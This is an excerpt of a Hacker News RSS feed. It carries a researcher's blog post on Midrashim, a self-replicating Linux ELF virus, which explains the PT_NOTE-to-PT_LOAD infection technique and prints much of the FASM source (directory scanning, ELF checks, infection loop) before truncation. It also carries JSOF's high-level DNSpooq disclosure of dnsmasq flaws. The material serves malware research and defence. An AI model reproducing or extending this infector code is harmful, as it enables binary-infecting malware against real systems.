        </item>
        <item>
            <title>
<![CDATA[Never Been Seen]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25833642">thread link</a>) | @louis-paul
<br/>
January 19, 2021 | https://thesciencemuseum.github.io/never-been-seen/ | <a href="https://web.archive.org/web/*/https://thesciencemuseum.github.io/never-been-seen/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://thesciencemuseum.github.io/never-been-seen/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25833642</guid>
            <pubDate>Tue, 19 Jan 2021 14:25:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linux.Midrashim: Assembly x64 ELF virus]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25833610">thread link</a>) | @elvis70
<br/>
January 19, 2021 | https://www.guitmz.com/linux-midrashim-elf-virus/ | <a href="https://web.archive.org/web/*/https://www.guitmz.com/linux-midrashim-elf-virus/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      
      

<h2 id="overview">Overview</h2>

<p>My interest in <em>Assembly</em> language started when I was a kid, mainly because of computer viruses of the <code>DOS</code> era. I’ve spent countless hours contemplating my first humble collection of source codes and samples (you can find it at <a href="https://github.com/guitmz/virii">https://github.com/guitmz/virii</a>) and to me, it’s cool how flexible and creative one can get with <em>Assembly</em>, even if its learning curve is steep.</p>

<p>I’m an independant malware researcher and wrote this virus to learn and have fun, expanding my knowledge on the several <em>ELF</em> attack/defense techniques and <em>Assembly</em> in general.</p>

<p>The code does not implement any evasion techniques and detection is trivial. Samples were also shared with a few major Antivirus companies prior to the release of this code and signatures were created, such as <code>Linux/Midrashim.A</code> by <a href="https://www.eset.com/">ESET</a>. I’m also working on a <em>vaccine</em> which will be available at a later date. I’ll update this post when it’s ready.</p>

<p>The payload is not destructive, as usual. It just prints the harmless lyrics of <a href="https://legacyofkain.fandom.com/wiki/Ozar_Midrashim">Ozar Midrashim</a> song to <code>stdout</code> and the layout of an infected file is the following (<a href="https://i.imgur.com/h4PVnL1.png">full image</a>):</p>

<p>
<img data-sizes="auto" data-src="https://i.imgur.com/h4PVnL1.png" data-srcset="https://i.imgur.com/h4PVnL1.png 1500w" src="https://i.imgur.com/h4PVnL1.png" srcset="https://i.imgur.com/h4PVnL1.png 1500w">
</p>

<h2 id="how-it-works">How it works</h2>

<p><code>Midrashim</code> is a <em>64 bits</em> Linux infector that targets ELF files in the current directory (non recursively). It relies on the well known <code>PT_NOTE -&gt; PT_LOAD</code> infection technique and should work on regular and <a href="https://access.redhat.com/blogs/766093/posts/1975793">position independent</a> binaries. This method has a high success rate and it’s easy to implement (and detect). Read more about it <a href="https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/">here</a>.</p>

<p>It will not work on <code>Golang</code> executables, because those need the <code>PT_NOTE</code> segment to run properly (infection works, but infected file will segfault after virus execution).</p>

<p>For simplicity’s sake, it makes use of <a href="https://linux.die.net/man/2/pread64">pread64</a> and <a href="https://linux.die.net/man/2/pwrite64">pwrite64</a> to read/write specific locations in the target file when it should use <a href="https://man7.org/linux/man-pages/man2/mmap.2.html">mmap</a> instead, for flexibility and reliability. A few other things could be improved too, like detecting first virus execution with a better approach and more error handling to minimize pitfalls.</p>

<p>I had so many ideas for the payload of Midrashim, from inspiration I got from projects at <a href="http://www.pouet.net/">http://www.pouet.net/</a> to controlling the terminal with ANSI escape codes (more on that <a href="https://www.guitmz.com/having-fun-with-ansi-codes-and-x64-linux-assembly/">here</a> - which is something I wrote with Midrashim in mind).</p>

<p>Due to lack of free time and given the complexity of implementing such things in Assembly, specially in a code of this nature, I ended up with something simpler and will probably revisit this subject on a future project.</p>

<h2 id="code">Code</h2>

<p>This is my first full assembly infector and should be assembled with <a href="https://flatassembler.net/">FASM</a> x64. Its core functionality consists of:</p>

<ul>
<li>Reserving space on stack to store values in memory</li>
<li>Checking if its virus first run (displays a different payload message if running for the first time)</li>
<li>Open current directory for reading</li>
<li>Loop through files in the directory, checking for targets for infection</li>
<li>Try to infect target file</li>
<li>Continue looping the directory until no more infection targets are available, then exit</li>
</ul>

<p>Full code with comments is available at <a href="https://github.com/guitmz/midrashim">https://github.com/guitmz/midrashim</a> and we’ll now go over each step above with a bit more detail.</p>

<p>If you need help understanding Linux <em>system calls</em> parameters, feel free to visit my new (work in progress) website: <a href="https://syscall.sh/">https://syscall.sh</a></p>

<h3 id="the-secret-of-getting-ahead-is-getting-started">The secret of getting ahead is getting started</h3>

<p>For the stack buffer, I used <code>r15</code> register and added the comments below for reference when browsing the code.</p>

<p>Note the values, for example, the ELF header, which is <em>64 bytes</em> long. Since <code>r15 + 144</code> represents its start, it should end at <code>r15 + 207</code>. The values in between are also accounted for, like <code>ehdr.entry</code> that starts at <code>r15 + 168</code>, which is <em>8 bytes</em> long, ends at <code>r15 + 175</code>.</p>

<div><pre><code data-lang="nasm"><span>; r15 + 0 = stack buffer = stat</span>
<span>; r15 + 48 = stat.st_size</span>
<span>; r15 + 144 = ehdr</span>
<span>; r15 + 148 = ehdr.class</span>
<span>; r15 + 152 = ehdr.pad</span>
<span>; r15 + 168 = ehdr.entry</span>
<span>; r15 + 176 = ehdr.phoff</span>
<span>; r15 + 198 = ehdr.phentsize</span>
<span>; r15 + 200 = ehdr.phnum</span>
<span>; r15 + 208 = phdr = phdr.type</span>
<span>; r15 + 212 = phdr.flags</span>
<span>; r15 + 216 = phdr.offset</span>
<span>; r15 + 224 = phdr.vaddr</span>
<span>; r15 + 232 = phdr.paddr</span>
<span>; r15 + 240 = phdr.filesz</span>
<span>; r15 + 248 = phdr.memsz</span>
<span>; r15 + 256 = phdr.align</span>
<span>; r15 + 300 = jmp rel</span>
<span>; r15 + 350 = directory size</span>
<span>; r15 + 400 = dirent = dirent.d_ino</span>
<span>; r15 + 416 = dirent.d_reclen</span>
<span>; r15 + 418 = dirent.d_type</span>
<span>; r15 + 419 = dirent.d_name</span>
<span>; r15 + 3000 = first run control flag</span>
<span>; r15 + 3001 = decoded payload</span></code></pre></div>

<p>Reserving stack space is easy, there are different ways of doing it, one is to subtract from <code>rsp</code>, then just store it in <code>r15</code>. Also right on start, we store <code>argv0</code> to <code>r14</code> (it’s going to be needed next) and we push <code>rdx</code> and <code>rsp</code>, which need to be restored before the end of virus execution, so the infected file can run properly.</p>

<div><pre><code data-lang="nasm"><span>v_start:</span>
    <span>mov</span> <span>r14</span><span>,</span> <span>[</span><span>rsp</span> <span>+</span> <span>8</span><span>]</span>  <span>; saving argv0 to r14</span>
    <span>push</span> <span>rdx</span>
    <span>push</span> <span>rsp</span>
    <span>sub</span> <span>rsp</span><span>,</span> <span>5000</span>       <span>; reserving 5000 bytes</span>
    <span>mov</span> <span>r15</span><span>,</span> <span>rsp</span>        <span>; r15 has the reserved stack buffer address</span></code></pre></div>

<p>To check for the virus first execution, we get <code>argv0</code> size in bytes and compare to the final virus size, which was stored in <code>V_SIZE</code>. If greater, it’s not the first run and we set a control value into a place in the stack buffer for later use. This was a last minute addition that it’s not great (but pretty easy to implement and rather obvious).</p>

<div><pre><code data-lang="nasm"><span>check_first_run:</span>
    <span>mov</span> <span>rdi</span><span>,</span>  <span>r14</span>                       <span>; argv0 to rdi</span>
    <span>mov</span> <span>rsi</span><span>,</span> <span>O_RDONLY</span>
    <span>xor</span> <span>rdx</span><span>,</span> <span>rdx</span>                        <span>; not using any flags</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_OPEN</span>
    <span>syscall</span>                             <span>; rax contains the argv0 fd</span>

    <span>mov</span> <span>rdi</span><span>,</span> <span>rax</span>
    <span>mov</span> <span>rsi</span><span>,</span> <span>r15</span>                        <span>; rsi = r15 = stack buffer address</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_FSTAT</span>                  <span>; getting argv0 size in bytes</span>
    <span>syscall</span>                             <span>; stat.st_size = [r15 + 48]</span>
    
    <span>cmp</span> <span>qword</span> <span>[</span><span>r15</span> <span>+</span> <span>48</span><span>],</span> <span>V_SIZE</span>        <span>; compare argv0 size with virus size</span>
    <span>jg</span> <span>load_dir</span>                         <span>; if greater, not first run, continue infecting without setting control flag</span>
    
    <span>mov</span> <span>byte</span> <span>[</span><span>r15</span> <span>+</span> <span>3000</span><span>],</span> <span>FIRST_RUN</span>    <span>; set the control flag to [r15 + 3000] to represent virus first execution</span></code></pre></div>

<h3 id="the-wild-hunt">The Wild Hunt</h3>

<p>We need to find targets to infect. For that we’ll open the current directory for reading using <a href="https://linux.die.net/man/2/getdents64">getdents64</a> syscall, which will return the number of entries in it. That goes into the stack buffer.</p>

<div><pre><code data-lang="nasm"><span>load_dir:</span>
    <span>push</span> <span>"."</span>                       <span>; pushing "." to stack (rsp)</span>
    <span>mov</span> <span>rdi</span><span>,</span> <span>rsp</span>                   <span>; moving "." to rdi</span>
    <span>mov</span> <span>rsi</span><span>,</span> <span>O_RDONLY</span>
    <span>xor</span> <span>rdx</span><span>,</span> <span>rdx</span>                   <span>; not using any flags</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_OPEN</span>
    <span>syscall</span>                        <span>; rax contains the fd</span>

    <span>pop</span> <span>rdi</span>
    <span>cmp</span> <span>rax</span><span>,</span> <span>0</span>                     <span>; if can't open file, exit now</span>
    <span>jbe</span> <span>v_stop</span>
    
    <span>mov</span> <span>rdi</span><span>,</span> <span>rax</span>                   <span>; move fd to rdi</span>
    <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>r15</span> <span>+</span> <span>400</span><span>]</span>           <span>; rsi = dirent = [r15 + 400]</span>
    <span>mov</span> <span>rdx</span><span>,</span> <span>DI</span><span>RENT_BUFSIZE</span>        <span>; buffer with maximum directory size</span>
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_GETDENTS64</span>
    <span>syscall</span>                        <span>; dirent contains the directory entries</span>
    
    <span>test</span> <span>rax</span><span>,</span> <span>rax</span>                  <span>; check directory list was successful</span>
    <span>js</span> <span>v_stop</span>                      <span>; if negative code is returned, I failed and should exit</span>
    
    <span>mov</span> <span>qword</span> <span>[</span><span>r15</span> <span>+</span> <span>350</span><span>],</span> <span>rax</span>     <span>; [r15 + 350] now holds directory size</span>
    
    <span>mov</span> <span>rax</span><span>,</span> <span>SYS_CLOSE</span>             <span>; close source fd in rdi</span>
    <span>syscall</span>
    
    <span>xor</span> <span>rcx</span><span>,</span> <span>rcx</span>                   <span>; will be the position in the directory entries</span></code></pre></div>

<p>Now the hunt gets a little more… <em>wild</em>, as we loop through each file from directory listing we just performed. Steps performed:</p>

<ul>
<li>Open target file</li>
<li>Validate that it’s an <em>ELF</em> and <em>64 bits</em> (by verifying its magic number and class information from its header)</li>
<li>Check if already infected (by looking for the infection mark that should be set in <code>ehdr.pad</code>) and

<ul>
<li>if yes, move to next file, until all files in the directory are checked</li>
<li>If not, loop through the target <em>Program Headers</em>, looking for a <code>PT_NOTE</code> section, starting the infection process upon finding it</li>
</ul></li>
</ul>

<div><pre><code data-lang="nasm"><span>file_loop:</span>
    <span>push</span> <span>rcx</span>                                   <span>; preserving rcx</span>
    <span>cmp</span> <span>byte</span> <span>[</span><span>rcx</span> <span>+</span> <span>r15</span> <span>+</span> <span>418</span><span>],</span> <span>DT_REG</span>         <span>; check if it's a regular file dirent.d_type = [r15 + 418]</span>
    <span>jne</span> <span>.continue</span>                              <span>; if not, proceed to next file</span>

    <span>.open_target_file:</span>
        <span>lea</span> <span>rdi</span><span>,</span> <span>[</span><span>rcx</span> <span>+</span> <span>r15</span> <span>+</span> <span>419</span><span>]</span>             <span>; dirent.d_name = [r15 + 419]</span>
        <span>mov</span> <span>rsi</span><span>,</span> <span>O_RDWR</span>
        <span>xor</span> <span>rdx</span><span>,</span> <span>rdx</span>                           <span>; not using any flags</span>
        <span>mov</span> <span>rax</span><span>,</span> <span>SYS_OPEN</span>
        <span>syscall</span>
    
        <span>cmp</span> <span>rax</span><span>,</span> <span>0</span>                             <span>; if can't open file, exit now</span>
        <span>jbe</span> <span>.continue</span>
        <span>mov</span> <span>r9</span><span>,</span> <span>rax</span>                            <span>; r9 contains target fd</span>
    
    <span>.read_ehdr:</span>
        <span>mov</span> <span>rdi</span><span>,</span> <span>r9</span>                            <span>; r9 contains fd</span>
        <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>r15</span> <span>+</span> <span>144</span><span>]</span>                   <span>; rsi = ehdr = [r15 + 144]</span>
        <span>mov</span> <span>rdx</span><span>,</span> <span>EHDR_SIZE</span>                     <span>; ehdr.size</span>
        <span>mov</span> <span>r10</span><span>,</span> <span>0</span>                             <span>; read at offset 0</span>
        <span>mov</span> <span>rax</span><span>,</span> <span>SYS_PREAD64</span>
        <span>syscall</span>
    
    <span>.is_elf:</span>
        <span>cmp</span> <span>dword</span> <span>[</span><span>r15</span> <span>+</span> <span>144</span><span>],</span> <span>0x464c457f</span>      <span>; 0x464c457f means .ELF (little-endian)</span>
        <span>jnz</span> <span>.close_file</span>                        <span>; not an ELF binary, close and continue to next file if any</span>
    
    <span>.is_64:</span>
        <span>cmp</span> <span>byte</span> <span>[</span><span>r15</span> <span>+</span> <span>148</span><span>],</span> <span>ELFCLASS64</span>       <span>; check if target ELF is 64bit</span>
        <span>jne</span> <span>.close_file</span>                        <span>; skipt it if not</span>
    
    <span>.is_infected:</span>
        <span>cmp</span> <span>dword</span> <span>[</span><span>r15</span> <span>+</span> <span>152</span><span>],</span> <span>0x005a4d54</span>      <span>; check signature in [r15 + 152] ehdr.pad (TMZ in little-endian, plus trailing zero to fill up a word size)</span>
        <span>jz</span> <span>.close_file</span>                         <span>; already infected, close and continue to next file if any</span>
    
        <span>mov</span> <span>r8</span><span>,</span> <span>[</span><span>r15</span> <span>+</span> <span>176</span><span>]</span>                    <span>; r8 now holds ehdr.phoff from [r15 + 176]</span>
        <span>xor</span> <span>rbx</span><span>,</span> <span>rbx</span>                           <span>; initializing phdr loop counter in rbx</span>
        <span>xor</span> <span>r14</span><span>,</span> <span>r14</span>                           <span>; r14 will hold phdr file offset</span>
    
    <span>.loop_phdr:</span>
        <span>mov</span> <span>rdi</span><span>,</span> <span>r9</span>                            <span>; r9 contains fd</span>
        <span>lea</span> <span>rsi</span><span>,</span> <span>[</span><span>r15</span> <span>+</span> <span>208</span><span>]</span>                   <span>; rsi = phdr = [r15 + 208]</span>
        <span>mov</span> <span>dx</span><span>,</span> <span>word</span> <span>[</span><span>r15</span> <span>+</span> <span>198</span><span>]</span>               <span>; ehdr.phentsize is at [r15 + 198]</span>
        <span>mov</span> <span>r10</span><span>,</span> <span>r8</span>                        …</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.guitmz.com/linux-midrashim-elf-virus/">https://www.guitmz.com/linux-midrashim-elf-virus/</a></em></p>]]>
            </description>
            <link>https://www.guitmz.com/linux-midrashim-elf-virus/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25833610</guid>
            <pubDate>Tue, 19 Jan 2021 14:20:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dnspooq Vulnerabilities in Dnsmasq]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25833606">thread link</a>) | @soberman
<br/>
January 19, 2021 | https://www.jsof-tech.com/disclosures/dnspooq/ | <a href="https://web.archive.org/web/*/https://www.jsof-tech.com/disclosures/dnspooq/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">
		<div data-elementor-type="wp-page" data-elementor-id="81059" data-elementor-settings="[]">
						<div>
							<div>
							<section data-id="2649a161" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						
		</section>
				<section data-id="a3f91cd" data-element_type="section">
						
		</section>
				<section data-id="482b506a" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
							<div>
					<div data-id="351b09c1" data-element_type="column">
			<div>
							<div>
						<div data-id="1eecf768" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeIn&quot;,&quot;_animation_delay&quot;:100}" data-widget_type="image.default">
				<div>
					<p><img width="450" height="220" src="https://www.jsof-tech.com/wp-content/uploads/2021/01/DNSPOOQ.png" alt="" srcset="https://www.jsof-tech.com/wp-content/uploads/2021/01/DNSPOOQ.png 450w, https://www.jsof-tech.com/wp-content/uploads/2021/01/DNSPOOQ-300x147.png 300w" sizes="(max-width: 450px) 100vw, 450px" data-pin-nopin="nopin">											</p>
				</div>
				</div>
				
				<div data-id="c8b4d83" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeIn&quot;,&quot;_animation_delay&quot;:300}" data-widget_type="heading.default">
				<p>
			<h3>7 new vulnerabilities are being disclosed in common DNS software dnsmasq,  reminiscent of 2008 weaknesses in Internet DNS Architecture </h3>		</p>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<nav data-id="12e17162" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;sticky&quot;:&quot;top&quot;,&quot;sticky_on&quot;:[&quot;desktop&quot;],&quot;sticky_offset&quot;:70,&quot;animation&quot;:&quot;fadeIn&quot;,&quot;animation_delay&quot;:300,&quot;sticky_effects_offset&quot;:0}">
						
		</nav>
				<section data-id="4be7ddee" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
							<div>
					<div data-id="18e9c6be" data-element_type="column">
			<div>
							<div>
						
				
				
				<div data-id="36e999f" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><h3><span>Vulnerabilities threaten DNS integrity (again)</span></h3>
<p>The JSOF research labs are reporting 7 vulnerabilities found in <em>dnsmasq</em>, an open-source DNS forwarding software in common use. Dnsmasq is very popular, and we have identified approximately 40 vendors whom we believe use dnsmasq in their products, as well as major Linux distributions.</p>
<p><br>The DNS protocol has a history of vulnerabilities dating back to the famous 2008 Kaminsky attack. Nevertheless, a large part of the Internet still relies on DNS as a source of integrity, in the same way it has for over a decade, and is therefore exposed to attacks that can endanger the integrity of parts of the web.</p>
<h3><span>DNSpooq</span></h3>
<p><span>The Dnspooq vulnerabilities include DNS cache poisoning vulnerabilities as well as a potential Remote code execution and others.&nbsp;</span><span>The list of devices using dnsmasq is long and varied.&nbsp;</span><span>According to our internet-based research, prominent users of dnsmasq seem to include Cisco routers, Android phones, Aruba devices, Technicolor, and Red-Hat, as well as Siemens, Ubiquiti networks, Comcast, and others listed below.&nbsp;</span><span>Depending on how they use dnsmasq, devices may be more or less affected, or not affected at all.&nbsp;</span></p>
<p><span>The origin of the name DNSpooq is a merge of 3 elements: DNS spoofing, the idea of a spook spying on Internet traffic, and the ‘q’ at the end of dnsmasq, replacing the ‘k’ of spook with a ‘q’. The spy or spook graphic illustrates the effects of an effective DNS spoofing on the ability to spy on internet traffic. The JSOF-pink glasses show how looking through tainted glasses, or a compromised middleman may alter your perception of the reality.</span></p>
<p><span>DNSpooq demonstrates that DNS implementations are still insecure, even today, 13 years after the last major attack was described.</span></p>
<p>Given the vulnerabilities in DNS over the years, you would think that the security-enhancement mechanisms that have been developed in response,&nbsp; would be ubiquitous by now. However, in reality, DNSSEC is still not very widely deployed, and neither is HSTS. For example, according to research from 2017, adoption of HSTS among the 1M most popular websites <span><a href="https://www.cs.umd.edu/sites/default/files/scholarly_papers/Petrov%2C%20Ivan_1801.pdf">was only at about 5%</a></span>). According to some rough estimates performed by JSOF with the help of large Internet companies, and matching external sources, around <span><a href="https://www.fortinet.com/blog/industry-trends/keeping-up-with-performance-demands-of-encrypted-web-traffic">15-20% of Internet traffic</a></span> is still completely unencrypted, and users still click through to insecure websites.</p>
<p><span>Credit and Appreciation</span></p>
<h2><span>DNSpooq disclosure was made possible through coordination of many different participants. Special appreciation for their efforts must be expressed to:</span></h2>
<ul>
<li>Help with disclosure coordination and fix efforts:
<ul>
<li>Vijay Sarvepalli (<em><a href="https://www.kb.cert.org/vuls/"><span>CERT Coordination Center [Cert/CC]</span>)</a></em></li>
</ul>
</li>
<li>Disclosure coordination and vulnerability communication:
<ul>
<li>Eugenio Iavarone, Francesco Casotto, and Xavier (<a href="https://www.cisco.com/c/en/us/index.html">Cisco</a>)</li>
<li>Francis Perron and Mihai Maruseac (<a href="https://www.google.com/">Google</a>)</li>
<li>Petr Menšík, Riccardo Schirone and Clifford Perry (<a href="https://www.redhat.com/en">Red Hat</a>)</li>
<li>Dr. Dominic (DL6ER), Dan Schaper (<span><a href="https://pi-hole.net/">Pi Hole</a></span>)</li>
</ul>
</li>
<li>Help with patch development:
<ul>
<li>Dan Schaper and Dr. Dominic (DL6ER) from&nbsp;<span><a href="https://pi-hole.net/">Pi-hole</a></span></li>
<li>Petr Menšík from&nbsp;<a href="https://www.redhat.com/en">Red Hat</a></li>
</ul>
</li>
<li>ICS-CERT coordination: Daniel Larson (<span><a href="https://us-cert.cisa.gov/ics">ICS-CERT</a></span>)</li>
<li>Patch creation and vulnerability responsiveness: Simon Kelley</li>
<li>PR and communications: Zachary Weiner</li>
<li>Proofreading: Ariel Schön from JSOF</li>
<li>Publication and disclosure communication: Sari Heyman from JSOF</li>
<li>Research: Moshe Kol and Shlomi Oberman from JSOF</li>
</ul>
<h3><span>History</span></h3>
<p>In 2008, well-known security researcher Dan Kaminsky found and disclosed a fundamental flaw in the Internet naming scheme that affected the most common DNS software and the integrity of the way the Internet worked at the time.</p>
<p>Kaminsky proved that attackers can impersonate any website name and steal data. (This has since become known as the “Kaminsky Attack”).</p>
<p>DNS has been considered a somewhat insecure protocol for decades, ever since the Kaminsky disclosure and even before that, though it is assumed to guarantee a certain level of integrity. This is the reason it is still heavily relied upon. At the same time, mechanisms have been developed to improve the security of the original DNS protocol. These mechanisms include HTTPS, HSTS, DNSSEC, and other initiatives. Browsers also try to increase users awareness by alerting them before accessing insecure sites with messages such as <a href="https://www.pandasecurity.com/en/mediacenter/panda-security/your-connection-is-not-private/"><span>“Your Connection is Not Private”</span></a>.</p>
<p><img src="https://www.jsof-tech.com/wp-content/uploads/2021/01/DNSpooq-IMG1-1024x350.png" alt="" width="531" height="181"></p>
<p>Nevertheless, even with all these mechanisms in place, a DNS hijack is still a dangerous attack in 2021. A large part of the Internet still relies on DNS in a similar manner as in 2008, and is exposed to attacks of the same types.</p>

<p><img src="https://www.jsof-tech.com/wp-content/uploads/2021/01/%D7%AA%D7%9E%D7%95%D7%A0%D7%942-1-300x137.png" alt="" width="455" height="208"></p>
</div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-id="667c043f" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
							<div>
					<div data-id="24289e2a" data-element_type="column">
			<div>
							<div>
						
				
				<div data-id="5d4610cc" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>The DNSpooq vulnerability set divides into 2 types of vulnerabilities:</span></p>
<ol>
<li><strong>DNS cache poisoning attacks</strong>, similar to the Kaminsky attack, but different in some aspects.</li>
<li><strong>Buffer overflow vulnerabilities</strong> that could lead to remote code execution.</li>
</ol>
<p><strong>(1)</strong> <strong>DNS Cache Poisoning:</strong> The impact of DNS cache poisoning of the routing equipment DNS forwarding server can potentially lead to different kinds of fraud if users believe they are browsing to one website but are actually routed to another.</p>
<p>Traffic that might be subverted includes regular Internet browsing as well as other types of traffic, such as emails, SSH, remote desktop, RDP video and voice calls, software updates, and so on. Some of these protocols have built-in measures to mitigate this type of attack, with varying degrees of effectiveness and so YMMV (Your mileage may vary).&nbsp;</p>
<h3><strong><span>DNS Cache Poisoning</span></strong></h3>
<p><img src="https://www.jsof-tech.com/wp-content/uploads/2021/01/%D7%AA%D7%9E%D7%95%D7%A0%D7%946.png" alt="" width="529" height="234" srcset="https://www.jsof-tech.com/wp-content/uploads/2021/01/%D7%AA%D7%9E%D7%95%D7%A0%D7%946.png 702w, https://www.jsof-tech.com/wp-content/uploads/2021/01/%D7%AA%D7%9E%D7%95%D7%A0%D7%946-300x133.png 300w" sizes="(max-width: 529px) 100vw, 529px"></p>
<p><strong>(2) Device take over: </strong>In addition to cache poisoning, every device on which an attacker can perform DNS cache poisoning can also potentially be taken over by the attacker. For example, in the case of a router, the attacker would then have complete control over all traffic going in and out of the network.</p>
<p>There are additional impacts possible for these types of attacks. <strong><em>These are hypotheticals</em></strong>, since to our knowledge they have never been performed by a malicious actor in this way, but they are a definite possibility if the vulnerabilities are exploited correctly. Even so, given the hypothetical nature of the situation, it is hard to analyze how likely they are to actually occur and what value they could bring to different malicious actors. These possibilities include:<br><strong>(A) Massive DDOS</strong>: Diversion of a large amount of web-traffic to an attacker-controlled website could be used to generate massive JavaScript-fueled Distributed Denial of Service attacks. Simplistic calculations show that the size of the attack could be on the same order of magnitude as the biggest DDOS attacks performed to date.</p>
<p><span><strong>Massive DDOS<br><img src="https://www.jsof-tech.com/wp-content/uploads/2021/01/%D7%AA%D7%9E%D7%95%D7%A0%D7%947.png" alt="" width="571" height="266" srcset="https://www.jsof-tech.com/wp-content/uploads/2021/01/%D7%AA%D7%9E%D7%95%D7%A0%D7%947.png 818w, https://www.jsof-tech.com/wp-content/uploads/2021/01/%D7%AA%D7%9E%D7%95%D7%A0%D7%947-300x140.png 300w, https://www.jsof-tech.com/wp-content/uploads/2021/01/%D7%AA%D7%9E%D7%95%D7%A0%D7%947-768x358.png 768w" sizes="(max-width: 571px) 100vw, 571px"><br></strong></span></p>
<p><strong>(B) Reverse DDOS</strong>: Prevention of certain users from accessing a website and logging of access attempts to a domain.</p>
<h3><span>Reverse DDOS<strong><br><img src="https://www.jsof-tech.com/wp-content/uploads/2021/01/%D7%AA%D7%9E%D7%95%D7%A0%D7%945.png" alt="" width="369" height="289" srcset="https://www.jsof-tech.com/wp-content/uploads/2021/01/%D7%AA%D7%9E%D7%95%D7%A0%D7%945.png 721w, https://www.jsof-tech.com/wp-content/uploads/2021/01/%D7%AA%D7%9E%D7%95%D7%A0%D7%945-300x235.png 300w" sizes="(max-width: 369px) 100vw, 369px"></strong></span></h3>
<p><strong>(C)</strong> “<b>Semi-</b><strong><b>Wormable</b>” <b>attacks</b></strong>: In situations where a mobile device moves between networks, the attack may be semi-wormable. It is not wormable in the traditional sense, since there are some pre-conditions and efforts needed on the attacker side for the exploit replication, but is semi-wormable in the sense that the exploit can continue to spread between vulnerable devices without explicit user interaction and without need for additional attacker access. In this scenario, a mobile device that was previously browsing in a network which uses an infected dnsmasq server receives a bad DNS record. When the device reaches a new network, it could infect the new network as well.</p>
<h6>Last paragraph’s wording has been edited for clarity following peer feedback.</h6>
<h3><span>Wormable Attacks</span><br><span><b><br><img src="https://www.jsof-tech.com/wp-content/uploads/2021/01/%D7%AA%D7%9E%D7%95%D7%A0%D7%949.png" alt="" width="594" height="152" srcset="https://www.jsof-tech.com/wp-content/uploads/2021/01/%D7%AA%D7%9E%D7%95%D7%A0%D7%949.png 567w, https://www.jsof-tech.com/wp-content/uploads/2021/01/%D7%AA%D7%9E%D7%95%D7%A0%D7%949-300x77.png 300w, https://www.jsof-tech.com/wp-content/uploads/2021/01/%D7%AA%D7%9E%D7%95%D7%A0%D7%949-562x145.png 562w" sizes="(max-width: 594px) 100vw, 594px"></b></span></h3>
</div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-id="b0ede2f" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
							<div>
					<div data-id="14a25125" data-element_type="column">
			<div>
							<div>
						
				
				<div data-id="4781772c" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><strong>Below are high-level technical details of the Vulnerabilities. For in depth information, please refer to our&nbsp;<span><a href="https://www.jsof-tech.com/dnspooq-technical-wp/">technical whitepaper</a></span>.</strong></p><h2>Terminology</h2><p><span>DNS:&nbsp;</span>DNS (Domain Name System) is an addressing system used in order to reach a domain. A name such as&nbsp;<span>‘<a href="http://www.example.com/">www.example.com</a>’</span>&nbsp;would be mapped to an IP address. The DNS protocol is based on&nbsp;<em>queries&nbsp;</em>asking where an address is located and&nbsp;<em>responses&nbsp;</em>containing an IP address. This is a basic feature of the Internet and is used by almost all computer software.</p><p><span>Dnsmasq:&nbsp;</span>Dnsmasq is a popular software used for caching of DNS responses. Storing the responses to previously asked DNS queries locally speeds up the DNS resolution process.</p><p>The software is installed on many home and commercial routers and servers in many organizations. Dnsmasq is used heavily by networking equipment, as well as being set up manually by IT personnel, usually in smaller networks. There are other uses of dnsmasq, such as providing DNS services to support Wi-Fi hot-spots, enterprise guest networks, virtualization, ad blocking, implementing a captive portal – the login screen that appears when logging in to a network in an airport or other public location and other use cases.</p><p><span>The DNSpooq vulnerability set divides into 2 types of vulnerabilities:</span></p><ol><li><strong>DNS cache poisoning attacks</strong>, similar to the Kaminsky attack, but different in some aspects.</li><li><strong>Buffer overflow vulnerabilities</strong> that could lead to remote code execution.</li></ol><h3><span>Cache Poisoning Vulnerabilities</span></h3><p>This type of attack allows subverting of DNS queries in an organization or device using dnsmasq. Essentially, this means that an attacker will be able to reroute communications made by a specific target that relies on a website name such as <a href="http://www.example.com/">www.example.com</a>.</p><p>These vulnerabilities are similar to the <em>SAD DNS</em> attacks reported recently by researchers at UC Riverside and Tsinghua University. SAD DNS also affect dnsmasq and other prevalent DNS software. The SAD DNS and DNSpooq vulnerabilities can also be combined to make attacks even easier. Additional attacks with …</p></div></div></div></div></div></div></div></div></section></div></div></div></div></div>
